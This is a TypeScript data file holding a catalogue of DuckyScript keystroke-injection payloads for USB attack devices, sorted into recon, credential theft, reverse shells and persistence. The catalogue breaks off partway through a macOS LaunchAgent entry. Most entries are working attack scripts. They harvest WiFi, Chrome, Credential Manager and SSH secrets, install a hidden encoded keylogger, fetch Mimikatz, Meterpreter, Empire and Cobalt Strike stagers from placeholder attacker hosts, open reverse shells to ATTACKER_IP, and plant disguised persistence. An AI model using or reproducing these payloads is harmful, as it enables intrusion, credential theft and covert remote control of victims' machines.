import type { DuckyScript } from './types'

export const DUCKY_SCRIPTS: DuckyScript[] = [
  // ==================== RECON ====================
  {
    id: 'recon-sysinfo-win',
    name: 'Windows System Info Dump',
    category: 'recon',
    description: 'Gathers comprehensive system information including OS version, hardware specs, network config, and installed software. Saves to a text file on the desktop.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows System Info Dump
REM Opens PowerShell and dumps system information
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $info = @(); $info += "=== SYSTEM INFO ==="; $info += (systeminfo | Out-String); $info += "=== NETWORK ==="; $info += (ipconfig /all | Out-String); $info += "=== USERS ==="; $info += (net user | Out-String); $info | Out-File "$env:USERPROFILE\\Desktop\\sysinfo.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-netconfig-win',
    name: 'Network Configuration Export',
    category: 'recon',
    description: 'Exports full network configuration including adapters, DNS, routing tables, and ARP cache.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Network Configuration Export
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== IPCONFIG ==="; $out += (ipconfig /all | Out-String); $out += "=== ROUTE TABLE ==="; $out += (route print | Out-String); $out += "=== ARP CACHE ==="; $out += (arp -a | Out-String); $out += "=== NETSTAT ==="; $out += (netstat -an | Out-String); $out += "=== DNS CACHE ==="; $out += (Get-DnsClientCache | Format-Table -AutoSize | Out-String); $out | Out-File "$env:USERPROFILE\\Desktop\\netconfig.txt"
ENTER
DELAY 5000
STRING exit
ENTER`
  },
  {
    id: 'recon-wifi-harvest',
    name: 'WiFi Password Harvester',
    category: 'recon',
    description: 'Extracts all stored WiFi network profiles and their plaintext passwords from the Windows credential store.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM WiFi Password Harvester
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-File "$env:USERPROFILE\\Desktop\\wifi_passes.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-installed-sw',
    name: 'Installed Software List',
    category: 'recon',
    description: 'Lists all installed software from the registry including version numbers and install dates.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~7s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Installed Software Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize | Out-File "$env:USERPROFILE\\Desktop\\installed_software.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-browser-history',
    name: 'Browser History Export',
    category: 'recon',
    description: 'Exports Chrome browser history database including URLs, visit counts, and timestamps.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Browser History Export (Chrome)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $histPath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History"; $dest = "$env:USERPROFILE\\Desktop\\chrome_history.db"; Copy-Item $histPath $dest -Force; $urls = @(); Add-Type -AssemblyName System.Data.SQLite; $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dest"); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 200"; $reader = $cmd.ExecuteReader(); while($reader.Read()){$urls += "$($reader['url']) | $($reader['title']) | Visits: $($reader['visit_count'])"}; $conn.Close(); $urls | Out-File "$env:USERPROFILE\\Desktop\\browser_history.txt"
ENTER
DELAY 4000
STRING exit
ENTER`,
    notes: 'Requires Chrome to be closed. Falls back if SQLite assembly not available.'
  },
  {
    id: 'recon-ad-enum',
    name: 'Active Directory Enumeration',
    category: 'recon',
    description: 'Enumerates Active Directory users, groups, computers, and OUs in a domain environment.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Active Directory Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Import-Module ActiveDirectory -ErrorAction SilentlyContinue; $out = @(); $out += "=== DOMAIN INFO ==="; $out += (Get-ADDomain | Out-String); $out += "=== DOMAIN CONTROLLERS ==="; $out += (Get-ADDomainController -Filter * | Select Name, IPv4Address | Out-String); $out += "=== USERS ==="; $out += (Get-ADUser -Filter * -Properties DisplayName,EmailAddress | Select Name,DisplayName,EmailAddress,Enabled | Out-String); $out += "=== GROUPS ==="; $out += (Get-ADGroup -Filter * | Select Name,GroupScope | Out-String); $out | Out-File "$env:USERPROFILE\\Desktop\\ad_enum.txt"
ENTER
DELAY 8000
STRING exit
ENTER`,
    notes: 'Requires domain-joined machine with RSAT tools or AD PowerShell module.'
  },
  {
    id: 'recon-usb-history',
    name: 'USB Device History',
    category: 'recon',
    description: 'Queries the registry for all USB devices that have been connected to the system, including serial numbers.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM USB Device History
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\*\\*" | Select-Object FriendlyName, DeviceDesc, Mfg, Service, HardwareID | Format-Table -AutoSize | Out-File "$env:USERPROFILE\\Desktop\\usb_history.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'recon-clipboard-dump',
    name: 'Clipboard History Dump',
    category: 'recon',
    description: 'Captures the current clipboard content and Windows clipboard history (if enabled).',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Clipboard History Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $clip = Get-Clipboard -Raw; "=== CURRENT CLIPBOARD ===" | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt"; $clip | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt" -Append; "=== CLIPBOARD HISTORY ===" | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt" -Append; Get-Clipboard -Format Text -TextFormatType UnicodeText | Out-File "$env:USERPROFILE\\Desktop\\clipboard.txt" -Append
ENTER
DELAY 2000
STRING exit
ENTER`
  },

  // ==================== CREDENTIALS ====================
  {
    id: 'cred-sam-dump',
    name: 'SAM Database Dump (mimikatz)',
    category: 'credentials',
    description: 'Downloads and runs Mimikatz to dump SAM database credentials. Requires admin privileges.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~20s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    script: `REM SAM Database Dump via Mimikatz
REM Requires administrative privileges
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString(\\\"https://ATTACKER_SERVER/mimikatz.ps1\\\"); Invoke-Mimikatz -Command \\\"privilege::debug sekurlsa::logonpasswords\\\" | Out-File C:\\Users\\Public\\creds.txt'"
ENTER
DELAY 1000
ALT y
DELAY 15000`,
    notes: 'Replace ATTACKER_SERVER with actual C2. UAC prompt will appear. Heavily flagged by AV.'
  },
  {
    id: 'cred-browser-pass',
    name: 'Browser Saved Passwords',
    category: 'credentials',
    description: 'Extracts saved passwords from Chrome using PowerShell and DPAPI decryption.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Chrome Saved Passwords Extractor
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $db = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"; $dest = "$env:TEMP\\logindata.db"; Copy-Item $db $dest -Force; Add-Type -AssemblyName System.Security; $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$dest"; $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"; $r = $cmd.ExecuteReader(); $out = @(); while($r.Read()){ $url = $r["origin_url"]; $user = $r["username_value"]; $encPass = [byte[]]$r["password_value"]; $decPass = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass,$null,"CurrentUser"); $pass = [System.Text.Encoding]::UTF8.GetString($decPass); $out += "$url | $user | $pass" }; $conn.Close(); $out | Out-File "$env:USERPROFILE\\Desktop\\chrome_creds.txt"
ENTER
DELAY 5000
STRING exit
ENTER`,
    notes: 'Chrome must be closed. Newer Chrome versions use AES-256-GCM encryption.'
  },
  {
    id: 'cred-wifi-extract',
    name: 'WiFi Credential Extract',
    category: 'credentials',
    description: 'Extracts all stored WiFi credentials in cleartext and exports them.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM WiFi Credential Extraction
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING netsh wlan export profile key=clear folder="%USERPROFILE%\\Desktop\\wifi_profiles"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'cred-ssh-keys',
    name: 'SSH Key Exfiltration',
    category: 'credentials',
    description: 'Copies SSH private keys from the user .ssh directory to an accessible location.',
    targetOS: ['windows', 'linux', 'macos'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM SSH Key Exfiltration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $sshDir = "$env:USERPROFILE\\.ssh"; if(Test-Path $sshDir){ $dest = "$env:USERPROFILE\\Desktop\\ssh_keys"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Copy-Item "$sshDir\\*" $dest -Recurse -Force; "SSH keys copied to $dest" | Out-File "$dest\\README.txt" } else { "No .ssh directory found" | Out-File "$env:USERPROFILE\\Desktop\\no_ssh.txt" }
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'cred-win-credmanager',
    name: 'Windows Credential Manager Dump',
    category: 'credentials',
    description: 'Dumps stored credentials from Windows Credential Manager using cmdkey and vaultcmd.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows Credential Manager Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== STORED CREDENTIALS (cmdkey) ==="; $out += (cmdkey /list | Out-String); $out += "=== VAULT CREDENTIALS ==="; $out += (vaultcmd /listcreds:"Windows Credentials" /all 2>&1 | Out-String); $out += (vaultcmd /listcreds:"Web Credentials" /all 2>&1 | Out-String); $out | Out-File "$env:USERPROFILE\\Desktop\\credmanager.txt"
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'cred-outlook-token',
    name: 'Outlook/Email Token Grab',
    category: 'credentials',
    description: 'Extracts Outlook OAuth tokens and cached email credentials from registry and profile data.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Outlook Token Extraction
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== OUTLOOK PROFILES ==="; $out += (Get-ItemProperty "HKCU:\\Software\\Microsoft\\Office\\*\\Outlook\\Profiles\\*\\*" -ErrorAction SilentlyContinue | Out-String); $out += "=== CACHED TOKENS ==="; $tokPath = "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"; if(Test-Path $tokPath){ Get-ChildItem $tokPath -Recurse | ForEach-Object { $out += "--- $($_.Name) ---"; $out += (Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) }}; $out | Out-File "$env:USERPROFILE\\Desktop\\outlook_tokens.txt"
ENTER
DELAY 5000
STRING exit
ENTER`
  },
  {
    id: 'cred-keylogger',
    name: 'PowerShell Keylogger Install',
    category: 'credentials',
    description: 'Installs a lightweight PowerShell keylogger that captures keystrokes to a hidden log file.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM PowerShell Keylogger Install
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = '$api = Add-Type -MemberDefinition ''[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'' -Name "KL" -PassThru; $logFile = "$env:TEMP\\kl.log"; while($true){ for($i=8;$i -le 190;$i++){ if($api::GetAsyncKeyState($i) -eq -32767){ $key = [System.Enum]::GetName([System.Windows.Forms.Keys],$i); $ts = Get-Date -Format "HH:mm:ss"; "$ts : $key" | Out-File $logFile -Append }}; Start-Sleep -Milliseconds 40}'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden
ENTER
DELAY 2000
STRING exit
ENTER`,
    notes: 'Keystrokes logged to %TEMP%\\kl.log. Run continuously until process killed.'
  },
  {
    id: 'cred-keepass-extract',
    name: 'KeePass Database Locate',
    category: 'credentials',
    description: 'Searches for KeePass database files (.kdbx) across common locations and copies them.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~12s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM KeePass Database Locator
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $dest = "$env:USERPROFILE\\Desktop\\kp_files"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; Get-ChildItem -Path "C:\\Users" -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName "$dest\\$($_.Name)" -Force; $_.FullName | Out-File "$dest\\locations.txt" -Append }; "Search complete" | Out-File "$dest\\done.txt"
ENTER
DELAY 8000
STRING exit
ENTER`
  },

  // ==================== REVERSE SHELLS ====================
  {
    id: 'revshell-powershell',
    name: 'PowerShell Reverse Shell',
    category: 'reverse-shells',
    description: 'Establishes a reverse PowerShell session to the attacker machine using TCP sockets.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM PowerShell Reverse Shell
REM Replace ATTACKER_IP and PORT
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING $c = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r = (iex $d 2>&1 | Out-String); $r2 = $r + "PS " + (pwd).Path + "> "; $sb = ([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush() }; $c.Close()
ENTER`,
    notes: 'Replace ATTACKER_IP with your listener IP. Start listener with: nc -lvnp 4444'
  },
  {
    id: 'revshell-netcat',
    name: 'Netcat Reverse Shell',
    category: 'reverse-shells',
    description: 'Downloads netcat (ncat) and establishes a reverse shell with persistent reconnection.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Netcat Reverse Shell
REM Replace ATTACKER_IP
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri "https://ATTACKER_SERVER/nc.exe" -OutFile "$env:TEMP\\nc.exe"; Start-Process "$env:TEMP\\nc.exe" -ArgumentList "-e cmd.exe ATTACKER_IP 4444" -WindowStyle Hidden
ENTER`,
    notes: 'Host nc.exe on attacker server. Many AV will flag nc.exe.'
  },
  {
    id: 'revshell-python',
    name: 'Python Reverse Shell',
    category: 'reverse-shells',
    description: 'Uses Python (if installed) to create a reverse shell connection.',
    targetOS: ['windows', 'linux', 'macos'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Python Reverse Shell
REM Replace ATTACKER_IP
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" 2>$null; python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
ENTER`,
    notes: 'Tries python then python3. Requires Python installed on target.'
  },
  {
    id: 'revshell-bash',
    name: 'Bash Reverse Shell',
    category: 'reverse-shells',
    description: 'Creates a bash reverse shell on Linux/macOS targets via /dev/tcp.',
    targetOS: ['linux', 'macos'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Bash Reverse Shell (Linux/macOS)
REM Replace ATTACKER_IP
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 500
STRING disown
ENTER
STRING exit
ENTER`,
    notes: 'For macOS uses Spotlight to launch Terminal. For Linux, adapt GUI shortcut.'
  },
  {
    id: 'revshell-meterpreter',
    name: 'Meterpreter Stager',
    category: 'reverse-shells',
    description: 'Downloads and executes a Meterpreter reverse_https stager for Metasploit.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~12s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    script: `REM Meterpreter Stager (reverse_https)
REM Replace ATTACKER_IP
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX(New-Object Net.WebClient).DownloadString("https://ATTACKER_IP:8443/payload.ps1")
ENTER`,
    notes: 'Generate payload: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=8443 -f psh -o payload.ps1'
  },
  {
    id: 'revshell-empire',
    name: 'Empire Stager',
    category: 'reverse-shells',
    description: 'PowerShell Empire stager that establishes an encrypted C2 channel.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    script: `REM PowerShell Empire Stager
REM Replace STAGER_URL with Empire listener URL
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX($wc.DownloadString("https://STAGER_URL/stage0"))
ENTER`,
    notes: 'Configure Empire listener first. Uses system proxy for egress.'
  },
  {
    id: 'revshell-cobaltstrike',
    name: 'Cobalt Strike Beacon (template)',
    category: 'reverse-shells',
    description: 'Template for deploying a Cobalt Strike beacon via PowerShell cradle.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~10s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    script: `REM Cobalt Strike Beacon Stager
REM Replace TEAMSERVER_URL
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $data = (New-Object Net.WebClient).DownloadData("https://TEAMSERVER_URL/beacon.bin"); $assembly = [System.Reflection.Assembly]::Load($data); $assembly.EntryPoint.Invoke($null, @(,[string[]]@()))
ENTER`,
    notes: 'Template only. Requires configured Cobalt Strike team server and generated beacon.'
  },

  // ==================== PERSISTENCE ====================
  {
    id: 'persist-registry-run',
    name: 'Registry Run Key',
    category: 'persistence',
    description: 'Adds a registry Run key to execute a payload every time the user logs in.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Registry Run Key Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\update.ps1" -PropertyType String -Force
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Payload (update.ps1) must be placed at the specified path separately.'
  },
  {
    id: 'persist-schtask',
    name: 'Scheduled Task Persistence',
    category: 'persistence',
    description: 'Creates a scheduled task that runs a payload at user logon and every 30 minutes.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Scheduled Task Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\task.ps1"; $trigger1 = New-ScheduledTaskTrigger -AtLogon; $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30); Register-ScheduledTask -TaskName "Microsoft\\Windows\\Maintenance\\SystemHealthCheck" -Action $action -Trigger $trigger1,$trigger2 -Description "System Health Monitor" -Force
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'persist-wmi-event',
    name: 'WMI Event Subscription',
    category: 'persistence',
    description: 'Creates a WMI permanent event subscription for fileless persistence.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    script: `REM WMI Event Subscription Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $filterName = "SystemCoreFilter"; $consumerName = "SystemCoreConsumer"; $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"; $wmiParams = @{Namespace = "root\\subscription"; ErrorAction = "Stop"}; $filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name=$filterName; EventNamespace="root\\cimv2"; QueryLanguage="WQL"; Query=$query} @wmiParams; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name=$consumerName; CommandLineTemplate="powershell -WindowStyle Hidden -File C:\\Users\\Public\\wmi.ps1"} @wmiParams; Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} @wmiParams
ENTER
DELAY 3000
STRING exit
ENTER`,
    notes: 'Survives reboots. Requires admin. Very stealthy but detectable by Sysmon.'
  },
  {
    id: 'persist-startup-folder',
    name: 'Startup Folder Drop',
    category: 'persistence',
    description: 'Drops a VBS launcher into the user Startup folder for login persistence.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Startup Folder Persistence
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $vbs = 'Set objShell = WScript.CreateObject("WScript.Shell")' + [char]13 + 'objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\startup.ps1", 0, False'; $startupPath = [Environment]::GetFolderPath("Startup"); $vbs | Out-File "$startupPath\\MicrosoftEdgeUpdate.vbs" -Encoding ASCII
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'persist-service-install',
    name: 'Service Installation',
    category: 'persistence',
    description: 'Installs a Windows service that runs as SYSTEM for persistent access.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows Service Persistence
REM Requires admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command New-Service -Name \\\"WinDefendUpdate\\\" -BinaryPathName \\\"C:\\\\Users\\\\Public\\\\svc.exe\\\" -DisplayName \\\"Windows Defender Update Service\\\" -StartupType Automatic -Description \\\"Provides real-time protection updates\\\"; Start-Service WinDefendUpdate'"
ENTER
DELAY 1000
ALT y
DELAY 3000`,
    notes: 'Requires admin (UAC bypass). Service binary must be placed first.'
  },
  {
    id: 'persist-dll-hijack',
    name: 'DLL Hijack Setup',
    category: 'persistence',
    description: 'Identifies DLL hijacking opportunities and places a malicious DLL in the search path.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~15s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    script: `REM DLL Hijack Enumeration & Setup
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $procs = Get-Process | Where-Object {$_.Path -and $_.Path -notlike "*\\Windows\\*"} | Select-Object -Unique Path; $out = @(); foreach($p in $procs){ $dir = Split-Path $p.Path; $dlls = Get-ChildItem "$dir\\*.dll" -ErrorAction SilentlyContinue | Select-Object Name; $out += "=== $($p.Path) ==="; $out += ($dlls | Out-String) }; $out | Out-File "$env:USERPROFILE\\Desktop\\dll_enum.txt"; "Enumeration complete" | Out-File "$env:USERPROFILE\\Desktop\\dll_enum_done.txt"
ENTER
DELAY 10000
STRING exit
ENTER`,
    notes: 'First step is enumeration. Actual DLL placement requires further analysis of missing DLLs.'
  },
  {
    id: 'persist-crontab-linux',
    name: 'Crontab Persistence (Linux)',
    category: 'persistence',
    description: 'Adds a cron job that executes a reverse shell every 5 minutes on Linux targets.',
    targetOS: ['linux'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Crontab Persistence (Linux)
DELAY 1000
CTRL ALT t
DELAY 1000
STRING (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Visible in crontab -l output.'
  },
  {
    id: 'persist-launchagent-mac',
    name: 'LaunchAgent Persistence (macOS)',
    category: 'persistence',
    description: 'Creates a macOS LaunchAgent plist for persistent execution at user login.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM macOS LaunchAgent Persistence
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING cat > ~/Library/LaunchAgents/com.apple.systemupdate.plist << 'EOF'
ENTER
STRING <?xml version="1.0" encoding="UTF-8"?>
ENTER
STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
ENTER
